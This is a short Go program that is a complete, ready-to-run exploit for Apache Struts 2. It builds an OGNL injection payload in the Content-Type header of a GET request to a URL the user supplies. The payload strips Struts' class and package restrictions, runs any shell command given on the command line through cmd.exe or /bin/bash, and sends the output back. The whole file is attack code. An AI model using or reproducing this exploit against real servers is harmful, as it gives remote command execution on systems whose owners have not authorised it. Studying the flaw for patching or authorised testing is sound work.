package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
)

func main() {
	uri := flag.String("u", "", "URL for the struts actions")
	command := flag.String("c", "whoami", "command to execute")
	flag.Parse()

	if *uri == "" || *command == "" {
		fmt.Println("Missing required argument")
		os.Exit(1)
	}

	u, err := url.Parse(*uri)
	if err != nil {
		fmt.Println("Error parsing url")
		fmt.Println(err)
		os.Exit(1)
	}

	client := http.DefaultClient
	if u.Scheme == "https" {
		client = &http.Client{
			Transport: &http.Transport{
				TLSClientConfig: &tls.Config{
					InsecureSkipVerify: true,
				},
			},
		}
	}

	req, err := http.NewRequest("GET", u.String(), nil)
	if err != nil {
		fmt.Println("Error creating request")
		fmt.Println(err)
		os.Exit(1)
	}

	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko")

	payload := "%{(#_='multipart/form-data')."
	payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
	payload += "(#_memberAccess?"
	payload += "(#_memberAccess=#dm):"
	payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
	payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
	payload += "(#ognlUtil.getExcludedPackageNames().clear())."
	payload += "(#ognlUtil.getExcludedClasses().clear())."
	payload += "(#context.setMemberAccess(#dm))))."
	payload += fmt.Sprintf("(#cmd='%s').", *command)
	payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
	payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
	payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
	payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
	payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
	payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
	payload += "(#ros.flush())}"

	req.Header.Set("Content-Type", payload)
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("There was an error while sending the request")
		fmt.Println(err)
		os.Exit(1)
	}
	if resp.StatusCode != 200 {
		fmt.Println("Response was non-200 code. System likley not vulnerable")
		os.Exit(0)
	}
	fmt.Println("Command executed:")
	data, _ := ioutil.ReadAll(resp.Body)
	fmt.Println(string(data))
}
